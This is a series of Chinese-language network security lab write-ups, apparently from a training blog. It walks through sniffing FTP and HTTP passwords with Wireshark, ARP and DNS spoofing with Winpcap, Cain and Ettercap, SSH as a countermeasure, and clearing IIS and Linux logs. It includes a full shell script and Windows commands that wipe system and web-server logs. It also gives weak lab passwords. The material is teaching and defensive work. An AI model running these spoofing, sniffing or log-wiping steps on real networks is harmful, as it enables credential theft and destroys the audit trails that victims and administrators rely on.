通过WireShark，我们能够了解到数据包中的全部明文信息，而且WireShark还能通过序列号及确认号做出分析，判断该帧属于连接过程中的哪一阶段。 捕获用户名密码：传输建立后，服务器的FTP进程做出响应，如下图所示。 220：表示“服务就绪”。后面为服务器返回的欢迎信息。 服务器的响应报文中ACK、PSH标志位置1，PSH位置1表示服务器希望尽快得到客户端的响应。客户端接收到此报文后会尽快将此报文交付应用进程，而不是等到缓存堆满后交付。 本地FTP提示用户输入用户名，报文内容为向服务器发送用户名请求 331：表示用户名正确，需要口令。客户端收到交给本地FTP处理，用户键入口令，客户端向服务器发送请求 请求的内容为口令PASS，消息为password，此时，用户名、密码均已嗅探得到了。用户已登录，如下图所示 230：表示用户已登录 五【实验思考】l 以所抓网络数据包为例，分析数据封装的过程l 根据抓获的网络数据包，实际分析FTP交互的过程，标出捕获的用户名/密码对 wireshark进行网络监听一【实验目标】l 掌握使用CCProxy配置代理服务器l 掌握使用wireshark抓取数据包l 能够对数据包进行简单的分析 二【实验环境】l 实验机环境：Windows XP系统l 目标机环境：Windows2003系统l 实验拓扑：如下图所示。 三【实验原理】​ 1）网络监听是一种监视网络状态、数据流程以及网络上信息传输的管理工具，它可以将网络界面设定成监听模式，并且可以截获网络上所传输的信息。也就是说，当黑客登录网络主机并取得超级用户权限后，若要登录其它主机，使用网络监听便可以有效地截获网络上的数据，这是黑客使用最好的方法。但是网络监听只能应用于连接同一网段的主机，通常被用来获取用户密码等。​ 2）以太网协议的工作方式是将要发送的数据包发往连接在一起的所有主机。在包头中包括有应该接收数据包的主机的正确地址，因为只有与数据包中目标地址一致的那台主机才能接收到信息包，但是当主机工作在监听模式下的话，不管数据包中的目标物理地址是什么，主机都将可以接收到。许多局域网内有十几台甚至上百台主机是通过一个电缆、一个集线器连接在一起的，在协议的高层或者用户来看，当同一网络中的两台主机通信的时候，源主机将写有目的的主机地址的数据包直接发向目的主机。​ 3）代理服务器：代理服务器英文全称是Proxy Server，其功能就是代理网络用户去取得网络信息。形象的说：它是网络信息的中转站。​ 4）中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。 四【实验步骤】1 配置代理服务器，实验机作为代理服务器，单击桌面上的CCProxy图标启动CCProxy，如下图所示： 代理服务器的地址： 2 在目标机设置IIS WEB服务器以支持ASP 3 在目标机打开IE浏览器，设置代理服务器： 4 登录http://192.168.8.237 5 在实验机打开桌面的wireshark，进行监听。6 设置过滤规则，在“Filter”中填写“http”并回车，只过滤HTTP协议，选择网卡后，单击开始，进入抓包模式。 7 切换到目标机，点击“管理留言”，输入用户名与密码进入管理界面。 8 对wireshark捕获的数据进行分析，查看捕获到的数据。 得到被监听用户的账号密码（皆为admin） 五【实验思考】l 如果你是用户，设置某代理服务器后，什么样的信息会面临监听风险？在被此状态下，一切明文信息都有被监听的风险。l 有哪些方法可以避免监听？将在传输中的信息进行加密。此外，登录系统应保存用户密码的hash散列值而不是密码本身，用户在本机登录过程中，发送的信息应该是用户输入的密码的散列值以跟服务器内的散列值匹配而不是发送密码。这样即使被监听到，中间人也无法恢复原密码或找到碰撞匹配。 Winpcap编程实现ARP欺骗一【实验目标】l 掌握Winpcap的编程方法；l 理解ARP欺骗的原理 二【实验环境】l 实验机环境：Windows XP系统 三【实验原理】ARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址。ARP协议并不只在发送了ARP请求才接受ARP应答。当计算机接收到ARP应答数据包的时候，就会对本地的ARP缓存进行更新，将应答中的IP和MAC地址存储在ARP缓存表中。因此，当局域网中的某台机器B向A发送一个自己伪造的ARP应答，而如果这个应答是B冒充C伪造来的，即IP地址为C的IP,而MAC地址是伪造的，则当A接收到B伪造的ARP应答后，就会更新本地的ARP缓存，这样A看来C的IP地址没有变，而它的MAC地址已经不是原来那个了。 四【实验步骤】1、 准备工作从影响网络连接通畅的方式来看，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了。2、 ARP数据包格式要进行ARP欺骗攻击，就必须熟悉ARP数据包的格式，以便构造ARP数据包进行欺骗攻击。 设计代码的主要思想就是通过发送自己构造的ARP数据包，不断地发送给被攻击者，使ip地址和真实的mac地址无法对应。接下来为实验过程。3、 查看未被攻击前的ARP表 192.168.8.1是局域网的网关，上网必须通过此网关进行数据交换，此时真实的mac地址为00-06-f6-43-44-4a。4、 运行程序 5、 原理解释该程序为每隔0.5秒给被攻击者发送一个数据回复包。从虚拟机的wireshark中可以抓到该ARP欺骗包，分析ARP数据包的格式可以发现与自己构造的数据包一样，即表示攻击成功。 6、 再次查看ARP缓存表发现已经被虚假的mac地址给替换了。 由于192.168.8.1为网关的IP地址，所以其mac地址一旦被篡改，则无法进行联网，即进行了”禁止上网”攻击。 五【实验思考】l 面对ARP欺骗我们应该如何应对 cain进行ARP_DNS欺骗实验实验环境虚拟机windows 2012 x64 位（开机密码：1qaz2wsx!）CainAbel 实验原理ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。ARP表是IP地址和MAC地址的映射关系表，任何实现了IP协议栈的设备，一般情况下都通过该表维护IP地址和MAC地址的对应关系，这是为了避免ARP解析而造成的广播数据报文对网络造成冲击。ARP表的建立一般情况下是通过二个途径： 主动解析如果一台计算机想与另外一台不知道MAC地址的计算机通信，则该计算机主动发ARP请求，通过ARP协议建立(前提是这两台计算机位于同一个IP子网上)。被动请求如果一台计算机接收到了一台计算机的ARP请求，则首先在本地建立请求计算机的IP地址和MAC地址的对应表。因此，针对ARP表项，一个可能的攻击就是误导计算机建立正确的ARP表。根据ARP协议，如果一台计算机接收到了一个ARP请求报文，在满足下列两个条件的情况下，该计算机会用ARP请求报文中的源IP地址和源物理地址更新 自己的ARP缓存：如果发起该ARP请求的IP地址在自己本地的ARP缓存中；请求的目标IP地址不是自己的。可以举一个例子说明这个过程，假设有三台计算机A，B，C，其中B已经正确建立了A和C计算机的ARP表项。假设A是攻击者，此时，A发出一个ARP请求报文，该ARP请求报文这样构造：源IP地址是C的IP地址，源物理地址是A的MAC地址；请求的目标IP地址是B的IP地址。这样计算机B在收到这个ARP请求报文后(ARP请求是广播报文，网络上所有设备都能收到)，发现B的ARP表项已经在自己的缓存中，但MAC地址与收到的请求的源物理地址不符，于是根据ARP协议，使用ARP请求的源物理地址(即A的MAC地址)更新自己的ARP表。这样B的ARP缓存中就存在这样的错误ARP表项：C的IP地址跟A的MAC地址对应。这样的结果是，B发给C的数据都被计算机A接收到。 DNS欺骗原理在DNS的缓存还没有过期之前,如果在DNS的缓存中已经存在的记录,一旦有客户查询,DNS服务器将会直接返回缓存中的记录. 下面我们来看一个例子:一台运行着unix的Internet主机,并且提供rlogin服务,它的IP地址为123.45.67.89,它使用的DNS服务器(即/etc/resolv.conf中指向的DNS服务器)的IP地址为98.76.54.32,某个客户端(IP地址为38.222.74.2)试图连接到unix主机的rlogin端口,假设unix主机的/etc/hosts.equiv文件中使用的是dns名称来允许目标主机的访问,那么unix主机会向IP为98.76.54.32的DNS服务器发出一个PTR记录的查询: 123.45.67.89 -&gt; 98.76.54.32 [Query]NQY: 1 NAN: 0 NNS: 0 NAD: 0QY: 2.74.222.38.in-addr.arpa PTR IP为98.76.54.32的DNS服务器中没有这个反向查询域的信息,经过一番查询,这个DNS服务器找到38.222.74.2和38.222.74.10为74.222.38.in-addr.arpa.的权威DNS服务器,所以它会向38.222.74.2发出PTR查询: 98.76.54.32 -&gt; 38.222.74.2 [Query]NQY: 1 NAN: 0 NNS: 0 NAD: 0QY: 2.74.222.38.in-addr.arpa PTR 请注意,38.222.74.2是我们的客户端IP,也就是说这台机子是完全掌握在我们手中的.我们可以更改它的DNS记录,让它返回我们所需要的结果: 38.222.74.2 -&gt; 98.76.54.32 [Answer]NQY: 1 NAN: 2 NNS: 2 NAD: 2QY: 2.74.222.38.in-addr.arpa PTRAN: 2.74.222.38.in-addr.arpa PTR trusted.host.comAN: trusted.host.com A 38.222.74.2NS: 74.222.38.in-addr.arpa NS ns.sventech.comNS: 74.222.38.in-addr.arpa NS ns1.sventech.comAD: ns.sventech.com A 38.222.74.2AD: ns1.sventech.com A 38.222.74.10 当98.76.54.32的DNS服务器收到这个应答后,会把结果转发给123.45.67.98,就是那台有rlogin服务的unix主机(也是我们的目标 :) ),并且98.76.54.32这台DNS服务器会把这次的查询结果缓存起来. 这时unix主机就认为IP地址为38.222.74.2的主机名为trusted.host.com,然后unix主机查询本地的/etc/hosts.equiv文件,看这台主机是否被允许使用rlogin服务,很显然,我们的欺骗达到了. 在unix的环境中,有另外一种技术来防止这种欺骗的发生,就是查询PTR记录后,也查询PTR返回的主机名的A记录,然后比较两个IP地址是否相同: 123.45.67.89 -&gt; 98.76.54.32 [Query]NQY: 1 NAN: 0 NNS: 0 NAD: 0QY: trusted.host.com A 很不幸,在98.76.54.32的DNS服务器不会去查询这个记录,而会直接返回在查询2.74.222.38.in-addr.arpa时得到的并且存在缓存中的信息: 98.76.54.32 -&gt; 123.45.67.89 [Query]NQY: 1 NAN: 1 NNS: 2 NAD: 2QY: trusted.host.com AAN: trusted.host.com A 38.222.74.2NS: 74.222.38.in-addr.arpa NS ns.sventech.comNS: 74.222.38.in-addr.arpa NS ns1.sventech.comAD: ns.sventech.com A 38.222.74.2AD: ns1.sventech.com A 38.222.74.10 那么现在unix主机就认为38.222.74.2就是真正的trusted.host.com了,我们的目的达到了! ARP欺骗和DNS欺骗的异同点ARP是局域网，DNS是internet攻击ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。 第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。 一般来说，ARP欺骗攻击的后果非常严重，大多数情况下会造成大面积掉线。有些网管员对此不甚了解，出现故障时，认为PC没有问题，交换机没掉线的“本事”，电信也不承认宽带故障。而且如果第一种ARP欺骗发生时，只要重启路由器，网络就能全面恢复，那问题一定是在路由器了。为此，宽带路由器背了不少“黑锅”。其实效果都差不多，ARP病毒您自己去百度一下，有很详细的资料，您看看应该就明白了。DNS攻击是阻塞服务器网络，使服务器瘫痪 实验步骤对Cain进行配置打开Cain（在C:\课程\网络欺骗技术\CainAbel-v4.9.53.zip压缩包中）解压出来是个安装包，默认安装。然后打开软件。 单击configure选项，然后在标签中选择ARP(Arp Poison Routeing)对话框中进行配置 其中192.168.242.155为伪造的IP地址。（根据实际子网情况选择同一自网段的伪造IP地址）选择功能栏的嗅探器sniffer，然后在选择下面的主机Hosts，在扫描前需要先激活嗅探器，点击上面的 ，然后再空白处右键单击，如图所示 选择Scan MAC Addresses进行扫描 点击下面的 ，然后在右边的空白处单击 然后点上面的“加号”，会出现一个New ARP Poison Routing对话框，在框的左边选取局域网的网关，在框的右边选取被欺骗的IP地址 点击 ARP-DNS选项，然后在点击上面的“加号”，并进行配置 然后点击第三个黄色图标开始欺骗 。 用192.168.242.128这台主机访问www.baidu.com进入的不是百度的首页而是211.71.233.40这个网站 实验完成在对ARP_DNS进行欺骗时，选择欺骗的网关应怎样设置?任意选择在框的左边选取在框的右边选取同时选取答案【B】 利用网络协议编辑软件实现ARP欺骗实验一【实验目标】l 理解实现ARP地址欺骗过程l 了解防范ARP地址欺骗 二【实验环境】l 实验机环境：windows xp操作系统l 目标机1环境：windows xp操作系统（作为网关）l 目标机2环境：windows xp操作系统l 实验拓扑：如下图所示。 三【实验原理】ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。ARP表是IP地址和MAC地址的映射关系表，任何实现了IP协议栈的设备，一般情况下都通过该表维护IP地址和MAC地址的对应关系，这是为了避免ARP解析而造成的广播数据报文对网络造成冲击。ARP表的建立一般情况下是通过二个途径：(1)主动解析如果一台计算机想与另外一台不知道MAC地址的计算机通信，则该计算机主动发ARP请求，通过ARP协议建立(前提是这两台计算机位于同一个IP子网上)。(2)被动请求如果一台计算机接收到了一台计算机的ARP请求，则首先在本地建立请求计算机的IP地址和MAC地址的对应表。因此，针对ARP表项，一个可能的攻击就是误导计算机建立正确的ARP表。根据ARP协议，如果一台计算机接收到了一个ARP请求报文，在满足下列两个条件的情况下，该计算机会用ARP请求报文中的源IP地址和源物理地址更新自己的ARP缓存：(1)如果发起该ARP请求的IP地址在自己本地的ARP缓存中；(2)请求的目标IP地址不是自己的。可以举一个例子说明这个过程，假设有三台计算机A，B，C，其中B已经正确建立了A和C计算机的ARP表项。假设A是攻击者，此时，A发出一个ARP请求报文，该ARP请求报文这样构造：(1)源IP地址是C的IP地址，源物理地址是A的MAC地址；(2)请求的目标IP地址是B的IP地址。这样计算机B在收到这个ARP请求报文后(ARP请求是广播报文，网络上所有设备都能收到)，发现B的ARP表项已经在自己的缓存中，但MAC地址与收到的请求的源物理地址不符，于是根据ARP协议，使用ARP请求的源物理地址(即A的MAC地址)更新自己的ARP表。这样B的ARP缓存中就存在这样的错误ARP表项：C的IP地址跟A的MAC地址对应。这样的结果是，B发给C的数据都被计算机A接收到。 四【实验步骤】(1) 启动windows实验台，Ping 网关。 (2) 在目标机2为192.168.8.184（ip地址是自动分配，具体ip请看实际情况）的主机上使用arp –a命令查看网关的arp的列表，如图所示。 (3) 从工具箱中下载工具，编辑ARP数据包，模拟网关路由器发送ARP更新信息，改变目标机2的arp列表。首先打开协议编辑软件，点击菜单栏“添加”。 (4) 添加一个ARP协议模板，将时间差设置为3毫秒，点击确认添加。 (5) 修改协议模板的每个值 (6) 编辑完成并经过校验的数据包。(7) 编辑并校验完成后，点击 发送 按钮。 (8) 在目标机2上使用命令arp –a命令来查看arp表项。 此时，所有向外发送的数据包，都会被转发到攻击者的主机上，从而获得敏感信息。用命令arp–d 命令来清空ip，以便后续实验的进行。 五【实验思考】l 如何防止ARP欺骗。l 如果受到了ARP欺骗如何破解这种欺骗并保持正常网络环境。 利用TCPDUMP进行网络嗅探l 实验机环境：KALI 2.0操作系统l 目标机环境：WINDOWS 2003系统 实验原理网络嗅探是指一个能够监视网络数据的软件程序或硬件设备。它可以通过复制数据的方法测试网站连通状况，不会修改数据。使用网络嗅探器，可以了解网站都有些什么信息。网络嗅探器既可以帮助网络工程师解决网络问题，但它同时也可以实现具有恶意的目标。如果网络数据未经加密，而且计算机之间的连接是使用集线器，那网络通信信息，例如用户名和密码、邮件内容等信息，都将很容易被捕获。幸运的是，如果组网使用的是交换机，那么问题会复杂一些，但仍可以捕获信息。 实验步骤 打开实验机，点击终端进入命令行模式，然后输入tcpdump –h查看工具使用方法 tpcdump可以不加任何参数，会默认监视第一个网络接口上所有流过的数据包 在目标机上打开命令提示符，输入ipconfig进行目标机ip地址的查询 得知目标机ip地址之后，在实验机终端上输入tcpdump host 192.168.122.33来监视目标机的数据包 在目标机上的命令提示符中输入ping 192.168.122.98 (实验机ip地址)，并查看实验机上的结果 监视主机的指定端口信息，tcpdump也可以做到，命令为：tcpdump udp port 53，然后打开kali自带的浏览器，并刷新。该端口是用来进行DNS查询的，而且用的是UPD协议 另外还可以监视TCP协议，命令为：tcpdump tcp port 80， 打开自带的浏览器，随意输入域名 再查看终端tcpdump界面，就会看到数据包信息 使用Ettercap工具实现中间人攻击l 实验机环境：KALI 2.0操作系统l 目标机环境：windows7系统 Ettercap是Linux下一个强大的欺骗工具，用户能使用该工具快速的创建伪造的包，实现从网络适配器到应用软件各种级别的包，绑定监听数据到一个本地端口等。用户通过使用ettercap工具实施中间人攻击，从而捕获到目标系统的信息，帮助用户创建密码字典。ARP欺骗并不是使网络无法正常通信，而是通过冒充网关或其它主机使得到达网关或主机的数据流通过攻击主机进行转发。通过转发流量可以对流量进行控制和查看，从而控制流量或得到机密信息。实现中间人攻击分为两个阶段。第一是通过某种手段去攻击一台计算机；第二是欺骗主机。第一阶段：主机B（攻击者）通过ARP注入攻击的方法以实现ARP欺骗，通过ARP欺骗的方法控制主机A（被攻击者）与其它主机间的流量及机密信息。第二阶段：在第一阶段攻击成功后，主机B就可以在这个网络中使用中间人的身份，转发或查看主机A和其它主机间的数据流。 实验步骤1、如果是第一次进行中间人攻击操作，需要对Ettercap的配置文件etter.conf进行编辑。2、首先使用locate命令查找该文件位置，如图：（由输出信息可知配置文件etter.conf保存在/etc/ettercap/中）3、输入命令 vi /etc/ettercap/etter.conf，使用Vim编辑器对该配置文件进行编辑。回车后如下图：（部分截图） 按a 进入编辑模式，将该文件中的ec_uid和ec_gid 配置项值改为0。（该部分输入结果较多，此处只列出了要修改的部分。） 修改前：privs ​ ec_uid = 65534 ​ ec_uid = 65534 修改后：privs ​ ec_uid = 0 ​ ec_uid = 0 将Linux部分附近iptables行的注释去掉。 5、编辑完成后按esc键再输 :wq 保存并退出。 6、输入命令 ettercap –G，打开Ettercap图形界面。 7、进行如下操作： 点击Unified sniffing，后，显示如下界面： 8、选择eth0，并“确定”，启动该接口。 9、进行如下操作，点击Scan for hosts后，扫描所有的主机。 10、选择Hosts list，将会显示扫描到的主机的IP和MAC地址，如下图： 11、在目标机中，打开“开始”菜单，输入cmd打开命令界面，输入命令ipconfig查看本机的IP。 12、返回Ettercap界面，选择192.168.122.175主机，然后单击Add to Target1按钮，添加目标系统。 13、进行如下操作，单击Start sniffing启动嗅探。 之后选择ARP poisoning，启动ARP注入攻击 选择Sniff remote connections。 14、此时使用主机192.168.122.175时，它的敏感信息会被传递给攻击者。 15、选择Stop sniffing，停止嗅探。 选择Stop mitm attack(s)，停止中间人攻击。 网络监听的防范一【实验目标】 l掌握防范网络监听的主要原理和技术手段 二【实验环境】 lSSH客户端环境：Windows XP系统，SSH客户端 lSSH服务端环境：Kali2系统，SSH服务器 l实验拓扑：如下图所示 三【实验原理】 对网络监听的防范措施主要包括以下几个。 1、从逻辑或物理上对网络分段 网络分段通常被认为是控制网络广播风暴的一种基本手段，但其实也是保证网络安全的一向措施。其目的是将非法用户与敏感的网络资源相互隔离，从而防止可能的非法监听。 2、以交换式集线器代替共享式集线器 对局域网的中心交换机进行网络分段后，局域网监听的危险任然存在。这是因为网络最终用户的接入往往是通过分支集线器而不是中心交换机，而使用最广泛的分支集线器通常是共享式集线器。这样，当用户与主机进行数据通信时，两台机器之间的数据包（称为单播包Unicase Packet）还是会被同一台集线器上的其他用户所监听。 因此，应该以交换式集线器代替共享式集线器，使单播包仅在两个节点之间传送，从而防止非法监听。当然，交换式集线器只能控制单播包而无法控制广播包（Broadcase Packet）和多播报（Multicase Packet）。但广播包和多播包内的关键信息，要远远少于单播包。 3、使用加密技术 数据经过加密后，通过监听仍然可以得到传送的信息，但显示的是乱码。使用加密技术的缺点是影响数据传输速度以及使用一个弱加密术比较容易被攻破。系统管理员和用户需要在网络速度和安全性上进行折中。 4、划分VLAN 运用VLAN（虚拟局域网）技术，将以太网通信变为点到点通信，可以防止大部分基于网络监听的入侵。 这里主要讨论加密技术来防止网络监听。传统的网络服务程序，如FTP、POP和Telnet在传输机制和实现原理上是没有考虑安全机制的，其本质上都是不安全的；因为他们在网络上用明文传送数据。用户账号和用户口令，别有用心的人通过窃听等网络攻击手段非常容易的就可以截获这些数据、用户账号和用户口令。SSH是英文Secure Shell的简写形式，通过使用SSH可以把所有传输的数据进行加密，这样就能够防止网络监听，也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、POP，甚至PPP提供一个安全的“通道”。 四【实验步骤】 1、打开SSH服务器机器，在终端输入 service ssh start以启动SSH服务端程序。输入service ssh status以检查SSH服务是否开启成功。如图2 2、打开Windows XP SSH客户端机器，点击快速链接按钮，出现“Connect to Romote Host”对话框。在“Host Name”里面填入SSH服务端主机的IP地址，在“User Name”内填入用户名“test”，Authentication选择Password，最后点击“Connect”按钮。如图3 在这一步，不要企图以root用户身份链接，因为在默认情况下，Linux不允许以root身份远程连接；所示应该建立非root用户连接，然后使用su命令获取root权限。如果有必要，应该事先创建一个非root账户。 紧接着我们输入密码123456点击“OK” 已经成功连接到SSH服务端。完成上述步骤后，就获得了服务器端的公钥，并且建立了认证关系 4、打开Edit菜单，选择Setting，在弹出的对话中左侧的树状结构中选择Keys节点，应该看到从服务器端传输过来的公钥。在这一步，还可以通过选择不同的按钮导入（Import）、导出（Export）、删除（Delete）主机公钥文件（注意与用户公钥文件的区别）。如图6 打开Sniffer Pro，开始捕获数据包，注意所捕到的数据包为加密包，可见通过SSH建立了安全连接。 同时建立到该机器的Telnet会话和SSH会话，注意Sniffer Pro所捕获的数据包的差异性：即Telnet连接信息时可见的、不加密的，而SSH会话连接会对相关信息进行数据加密，从而保障了通信安全。 5、通过SSH在FTP方式下安全的传输文件。打开F-Secure SSH FTP点击“Quick Connect”，在弹出的“Connect to Remote Host”对话中输入SSH服务端机器的IP地址，用户名输入“test”，点击“Connect”按钮。 输入密码，1234568 6、通过上述步骤，SSH客户将通过认证建立起一个安全的FTP连接。如图9 7、上传一个简单的文件到FTP站点。使用Sniffer Pro捕获数据包，查看数据包的内容。 打开命令行提示窗口，使用命令连接，使用get命令将刚才的文件下载，注意观察下载过程中Sniffer Pro所捕捉到的数据包，对比两次的捕获结果。 在Edit菜单中选择Settings，打开Settings对话框如图10.在这一步，可以对有关参数进行详细配置，以满足当前网络的不同需求，例如，可以通过选择File Transfer节点进行编辑。 五【实验思考】 l除使用SSH外还可以使用哪些技术类防范网络监听？请对比这些技术的优缺点。 ​]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志清除实验]]></title>
    <url>%2F2019%2F08%2F10%2F%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[Windows上的IIS日志手动清除实验 实验环境Windows7操作系统,IIS服务器实验目的手动清除本机上的IIS日志实验原理 IIS日志中记录以下信息： 请求发生在什么时刻， 哪个客户端IP访问了服务端IP的哪个端口， 客户端工具是什么类型，什么版本， 请求的URL以及查询字符串参数是什么， 请求的方式是GET还是POST， 请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码， 请求过程中，客户端上传了多少数据，服务端发送了多少数据， 请求总共占用服务器多长时间、等等。实验步骤 获取IIS日志文件的存放路径点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。 (2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。 (3)查看“W3C扩展日志文件”的保存位置复制“目录”中的路径，在文件夹中打开。 查看日志文件如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件 手动删除IIS日志文件(1)点击开始，在输入框中输入cmd，打开命令提示符，右键以管理员运行。使用命令cd C:\WINDOWS\system32\LogFiles\进入到该目录下，然后输入dir命令，查看该目录下的W3SVC目录。 (2)输入命令cd C:\WINDOWS\system32\LogFiles\W3SVC1\，转到W3SVC1目录下，输入命令net stop w3svc，停止w3svc服务，再输入：del .，删除所有日志文件，最后输入：net start w3svc，启动w3svc服务。 (3)再次打开w3svc1目录，发现日志文件已经清除了。 实验思考/练习掌握针对日志清除攻击的防御方法 linux日志清除实验实验环境 Ubantu linux 实验目的 手动清除linux的日志文件，掌握针对日志文件清除攻击的防御方法。实验原理 在ubantu linux系统中，在/var/log/目录下，包含了很多系统自动记录的日志信息。 /var/log/dmesg — 包含内核缓冲信息（kernel ring buffer），可以用dmesg查看它们。 /var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。 /var/log/boot.log — 包含系统启动时的日志。 /var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。 /var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。 /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。 /var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。 /var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。 /var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。 实验步骤 \1. 使用账号密码：root/123456登陆实验机，按ctrl+alt+t打开终端。 \2. 进入/varlog，查看该目录下的文件。 使用命令： cd /var/log/ ls 3.其中一部分文件的作用在实验原理部分已经介绍过了，接下来我们进行日志的清除。需要注意的是，如果直接输入 rm –r logfile ，这样是不行的，因为应用已经打开文件句柄，直接删除会造成1.应用无法正确释放日志文件和写入；2.显示磁盘空间未释放。 \4. 正确的清除日志方法是把以下代码保存为.sh后缀脚本来运行即可清除Linux系统日志 #!/bin/sh cat /dev/null &gt; /var/log/syslog cat /dev/null &gt; /var/log/wtmp cat /dev/null &gt; /var/log/maillog cat /dev/null &gt; /var/log/messages cat /dev/null &gt; /var/log/openwebmail.log cat /dev/null &gt; /var/log/maillog cat /dev/null &gt; /var/log/secure 首先，在/var/log目录下输入leafpad clear.sh，新建一个shell脚本并输入上面的内容，保存并退出： 5.需要修改脚本权限，使得shell脚本有清除系统日志的权限。使用命令chmod 755 clear.sh。再使用命令./clear.sh运行脚本，结束后，我们任意打开一个日志文件，发现日志已经清空了。 实验思考/练习为什么要使用shell脚本？ 利用AIO实现IIS日志清除实验环境Windows7操作系统实验目的掌握aio清除日志的方法实验原理 IIS日志中记录以下信息： 请求发生在什么时刻， 哪个客户端IP访问了服务端IP的哪个端口， 客户端工具是什么类型，什么版本， 请求的URL以及查询字符串参数是什么， 请求的方式是GET还是POST， 请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码， 请求过程中，客户端上传了多少数据，服务端发送了多少数据， 请求总共占用服务器多长时间、等等。实验步骤 获取IIS日志文件的存放路径点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。 (2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。 (3)查看“W3C扩展日志文件”的保存位置复制“目录”中的路径，在文件夹中打开。 查看日志文件如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件 手动删除IIS日志文件 (1)运行aio程序点击桌面-课程-工具，找到AIO的目录，按住shif再右键鼠标。 输入命令aio，运行成功后，会显示该工具的用法。 （2）运行删除日志命令使用aio -cleanlog删除默认位置的所有日志。日志删除命令执行界面。提示删除失败是因为权限的原因，如果要删除的话需要以管理员身份运行cmd，再执行一遍命令。 (3)检验是否清除成功再次进入c：\inetpub\logs\logfiles\目录，会提示没有这个目录，进入上一级目录，会发现已经没有logfiles这个目录了。 实验思考/练习比较aio工具与cleaniislog工具的区别。 利用CleanIISLog实现IIS日志清除实验环境Windows7操作系统。实验目的 了解IIS日志文件清除的基本原理;掌握CleanIISLog.exe工具的使用方法和各项功能.实验原理IIS日志中记录以下信息： 请求发生在什么时刻， 哪个客户端IP访问了服务端IP的哪个端口， 客户端工具是什么类型，什么版本， 请求的URL以及查询字符串参数是什么， 请求的方式是GET还是POST， 请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码， 请求过程中，客户端上传了多少数据，服务端发送了多少数据， 请求总共占用服务器多长时间、等等。实验步骤 获取IIS日志文件的存放路径点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。 (2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。 (3)查看“W3C扩展日志文件”的保存位置复制“目录”中的路径，在文件夹中打开。 查看日志文件如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件 